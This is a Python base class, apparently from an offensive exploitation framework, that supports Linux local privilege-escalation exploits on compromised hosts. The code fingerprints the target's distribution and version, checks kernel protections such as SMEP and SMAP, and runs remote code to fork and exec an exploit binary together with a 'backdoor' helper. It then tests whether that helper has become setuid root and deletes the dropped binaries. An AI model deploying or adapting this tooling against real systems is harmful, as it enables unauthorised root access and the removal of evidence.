#!/usr/bin/env python

"""
linuxLocalExploit.py - Stubs for linux locals
"""
import sys
import time
import re
import logging

if "." not in sys.path:
    sys.path.append(".")

from ExploitTypes.localexploit import LocalExploit


class LinuxLocalExploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.local_helper_32 = "backdoors/linux-mosdef-upgrade-32"
        self.local_helper_64 = "backdoors/linux-mosdef-upgrade-64"

        self.remote_exp      = ""
        self.remote_helper   = ""

    def _read_proc_file(self, path):
        """
        Read a remote proc file
        """
        node = self.argsDict["passednodes"][0]
        O_RDONLY = node.shell.libc.getdefine('O_RDONLY')
        fd = node.shell.open(path, O_RDONLY, 0755)
        if fd < 0:
            logging.error('Reading of %s failed' % path)
            return 0

        buf  = ""
        while True:
            line = node.shell.file_readline(fd)
            if not line:
                break
            buf += line

        node.shell.close(fd)
        return buf

    def panic_on_oops(self):
        """
        Return panic_on_oops setting from proc
        """
        buf  = self._read_proc_file("/proc/sys/kernel/panic_on_oops")
        return int(buf)

    def get_kmodules(self):
        """
        Return a list of modules
        """
        buf  = self._read_proc_file("/proc/modules")
        mods = []

        if not buf:
            logging.error('get_kmodules() failed')
        for line in buf.splitlines():
            m    = re.match(r'(\w+).*', line)
            mod  = m.group(1)
            mods.append(mod)

        return mods

    def check_smep(self):
        """
        Return True if SMEP is found on target node
        """
        buf = self._read_proc_file("/proc/cpuinfo")
        if not buf:
            logging.error('check_smep() failed')
        if "smep" in buf:
            return True
        return False

    def check_smap(self):
        """
        Return True if SMAP is found on target node
        """
        buf = self._read_proc_file("/proc/cpuinfo")
        if not buf:
            logging.error('check_smap() failed')
        if "smap" in buf:
            return True
        return False

    def stat_file(self, path):
        """
        Stat remote file found at path
        """
        O_RDONLY = self.node.shell.libc.getdefine('O_RDONLY')
        fd = self.node.shell.open(path, O_RDONLY, 0755)
        if fd < 0:
            logging.error('Could not open %s' % path)
            return {}

        ret, stat = self.node.shell.fstat(fd)
        self.node.shell.close(fd)
        if ret == 0:
            logging.debug('st_mode: %x' % stat['st_mode'])
            logging.debug('st_uid: %x' % stat['st_uid'])
            return stat
        else:
            logging.error('fstat() failed')
            return {}

    def is_32bit_node(self):
        """
        Return True if node is 32bit
        """
        if self.node.proctype == 'i386':
            return True
        else:
            logging.warning("Not a 32bit node")
            return False

    def is_64bit_node(self):
        """
        Return True if node is 64bit
        """
        if self.node.proctype == 'x64':
            return True
        else:
            logging.warning("Not a 64bit node")
            return False

    def get_os_info(self):
        """
        Return a dict containing 'distro' and 'version' for the target OS
        """

        # Backup method in case we can't access /etc/os-release
        os = [
            {"name": "ubuntu", "path": "/etc/lsb-release",    "reg": "DISTRIB_ID=(.*)\n.*DISTRIB_RELEASE=(.*)\n.*"},
            {"name": "debian", "path": "/etc/debian_version", "reg": "(.*).*"},
            {"name": "fedora", "path": "/etc/fedora-release", "reg": "(\w*) .* (\d*) .*"},
            {"name": "redhat", "path": "/etc/redhat-release", "reg": "(\w*) .* release (.*) \(.*"},
            {"name": "suse",   "path": "/etc/SuSE-release",   "reg": "(.*) \(.*\)\n.*VERSION = (.*)\n.*PATCHLEVEL = (.*)\n.*"},
        ]

        os_info = {}
        os_info["distro"] = "None"
        os_info["version"] = "None"

        fd = self.node.shell.open("/etc/os-release", self.node.shell.libc.getdefine('O_RDONLY'))
        if fd >= 0:
            data = self.node.shell.readall(fd)
            self.node.shell.close(fd)

            reg_1 = """NAME="(.*)"\n(?:.*=.*\n)*VERSION_ID="(.*)"\n.*"""
            reg_2 = """NAME=(.*)\n(?:.*=.*\n)*VERSION_ID=(.*)\n.*"""
            m = re.search(reg_1, data)
            if not m:
                m = re.search(reg_2, data)

            if m:
                os_info["distro"]  = m.group(1).split()[0].lower()

                #
                # Special case for debian as os-release reports only major version
                #
                if os_info["distro"] == "debian":
                    fd = self.node.shell.open("/etc/debian_version", self.node.shell.libc.getdefine("O_RDONLY"))
                    if fd >= 0:
                        data = self.node.shell.readall(fd)
                        self.node.shell.close(fd)

                        m = re.search("(.*).*", data)
                        if m:
                            os_info["version"] = m.group(1)
                else:
                    os_info["version"] = m.group(2)

                return os_info
            else:
                logging.error("Error while retrieving version information (generic)")

        logging.info("Trying to parse specific release information")
        for entry in os:
            fd = self.node.shell.open(entry["path"], self.node.shell.libc.getdefine('O_RDONLY'))
            if fd < 0:
                continue

            logging.debug("Found %s (reg %s)" % (entry["name"], entry["reg"]))
            data = self.node.shell.readall(fd)
            self.node.shell.close(fd)
            m = re.search(entry["reg"], data)
            if m:
                if entry["name"] == "debian":
                    os_info["distro"] = entry["name"]
                    os_info["version"] = m.group(1)
                else:
                    os_info["distro"] = m.group(1).split()[0].lower()

                    if entry["name"] == "suse":
                        os_info["version"] = "%s.%s" % (m.group(2), m.group(3))
                    else:
                        os_info["version"] = m.group(2)
            else:
                logging.error("Error while retrieving version information for %s" % entry["name"])

            break

        return os_info

    def is_ubuntu_14_04(self, os_info=None):
        if os_info is None:
            os_info = self.get_os_info()

        if os_info['distro'] == "ubuntu" and os_info['version'] == "14.04":
            return True

        return False

    def is_ubuntu_14_10(self, os_info=None):
        if os_info is None:
            os_info = self.get_os_info()

        if os_info['distro'] == "ubuntu" and os_info['version'] == "14.10":
            return True

        return False

    def is_ubuntu_15_04(self, os_info=None):
        if os_info is None:
            os_info = self.get_os_info()

        if os_info['distro'] == "ubuntu" and os_info['version'] == "15.04":
            return True

        return False

    def is_ubuntu_15_10(self, os_info=None):
        if os_info is None:
            os_info = self.get_os_info()

        if os_info['distro'] == "ubuntu" and os_info['version'] == "15.10":
            return True

        return False

    def fork_and_exec(self, command, wait = 0):
        """
        Fork and Exec either our exploit or helper on target node
        Caveats:
        - self.remote_helper is your remote helper path
        - self.remote_exp is your remote exploit path

        TODO: add ability to pass parameters to exploits
        """
        if not self.remote_helper:
            logging.error("self.remote_helper not set inside exploit class")
            return 1

        if not self.remote_exp:
            logging.error("self.remote_exp not set inside exploit class")
            return 1

        lvars            = {}
        lvars['COMMAND'] = command
        lvars['HELPER']  = self.remote_helper
        lvars['MOSDEF']  = '%d' % self.node.shell.fd
        lvars['WAIT']    = wait

        code = """
        #import "string", "COMMAND" as "COMMAND"
        """

        if command == self.remote_exp:
            code += """
        #import "string", "HELPER"  as "ARG1"
        """
        else:
            code += """
        #import "string", "MOSDEF"  as "ARG1"
        """

        code += """
        #import "int",    "WAIT"    as "WAIT"

        #import "local", "fork"    as "fork"
        #import "local", "execve"  as "execve"
        #import "local", "exit"    as "exit"
        #import "local", "sendint" as "sendint"
        #import "local", "waitpid" as "waitpid"


        void main()
        {
            char *argv[3];
            char **envp;
            int pid;

            envp = NULL;
            argv[0] = COMMAND;
            argv[1] = ARG1;
            argv[2] = NULL;

            pid = fork();

            if (pid == 0) {
                execve(argv[0], argv, envp);
                exit(-1);
            }

            sendint(0);

            if (WAIT == 1) {
                waitpid(pid, 0, 0);
            }
        }
        """

        ret = self.node.shell.runCode(code, lvars)
        return ret

    def init_mosdef_upgrade(self):
        """
        On 64bit nodes we need to init our base resolver functions again
        once we migrate to a privileged helper (or any other process)

        Only available for 64bit nodes
        """
        if self.is_64bit_node():
            #
            # Check if the target shellserver has the init_resolution() method
            #
            init_resolution = getattr(self.node.shell, "init_resolution", None)
            if callable(init_resolution):
                self.node.shell.clearfunctioncache()
                self.node.shell.clearlocalcache()
                self.node.shell.init_resolution()

                logging.info("Re-initializing remote resolver")
            else:
                logging.warning("init_mosdef_upgrade() is required only for 64bit processes")
        else:
            logging.warning("init_mosdef_upgrate() should be invoked only for 64bit nodes")

    def compromised(self, mosdef_helper, wait_secs):
        """
        Check if the mosdef_helper has been chmod'ed/chown'ed correctly by our exploit
        if <wait_secs> is 0 it will simply check once if remote node is compromised
        otherwise it will keep checking until <wait_secs>
        """
        if wait_secs > 0:
            while wait_secs:
                stat = self.stat_file(mosdef_helper)
                if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
                    return True
                wait_secs -= 1
                time.sleep(1)

            if not wait_secs:
                return False
        else:
            stat = self.stat_file(mosdef_helper)
            if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
                return True
            else:
                return False

    def cleanup(self):
        """
        Deprecated
        Superseeded by canvasexploit.add_file_for_cleanup()
        """
        logging.info('Cleaning up')

        if self.remote_exp:
            if not self.nodeDeleteFile(self.remote_exp):
                logging.error("Error while removing exploit binary (%s)" % self.remote_exp)
        else:
            logging.error("self.remote_exp not set inside exploit class")

        if self.remote_helper:
            if not self.nodeDeleteFile(self.remote_helper):
                logging.error("Error while removing helper binary (%s)" % self.remote_helper)
        else:
            logging.error("self.remote_helper not set inside exploit class")
